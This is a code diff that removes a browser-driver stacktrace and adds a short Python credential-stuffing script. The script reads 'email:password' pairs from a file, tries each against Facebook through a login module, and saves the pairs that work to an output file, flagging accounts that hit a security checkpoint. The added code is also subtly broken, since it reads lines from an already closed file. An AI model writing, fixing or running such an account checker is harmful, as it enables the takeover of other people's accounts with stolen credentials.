@@ -1,23 +1,14 @@
-Message: 
-Stacktrace:
-	GetHandleVerifier [0x00007FF6DD1B2142+3514994]
-	(No symbol) [0x00007FF6DCDD0CE2]
-	(No symbol) [0x00007FF6DCC776AA]
-	(No symbol) [0x00007FF6DCCC1860]
-	(No symbol) [0x00007FF6DCCC197C]
-	(No symbol) [0x00007FF6DCD04EE7]
-	(No symbol) [0x00007FF6DCCE602F]
-	(No symbol) [0x00007FF6DCD028F6]
-	(No symbol) [0x00007FF6DCCE5D93]
-	(No symbol) [0x00007FF6DCCB4BDC]
-	(No symbol) [0x00007FF6DCCB5C64]
-	GetHandleVerifier [0x00007FF6DD1DE16B+3695259]
-	GetHandleVerifier [0x00007FF6DD236737+4057191]
-	GetHandleVerifier [0x00007FF6DD22E4E3+4023827]
-	GetHandleVerifier [0x00007FF6DCF004F9+689705]
-	(No symbol) [0x00007FF6DCDDC048]
-	(No symbol) [0x00007FF6DCDD8044]
-	(No symbol) [0x00007FF6DCDD81C9]
-	(No symbol) [0x00007FF6DCDC88C4]
-	BaseThreadInitThunk [0x00007FFC85387344+20]
-	RtlUserThreadStart [0x00007FFC873626B1+33]
+from pages_functions.Facebook.Login import *
+with open("Newt.txt", "r") as file:
+    lines = file.readlines()
+    
+with open("output.txt", "w") as output_file:
+    lines = file.readlines()
+    for line in lines:
+        e , p  = line.strip().split(":")
+        result = Login(e,p).Start()
+        if result[0] == "success" :
+            if result[2] : output_file.write(f"{e}:{p}:{result[1]}" + "\n")
+            else : print("CheckPoint")
+        else : print (result)
+        
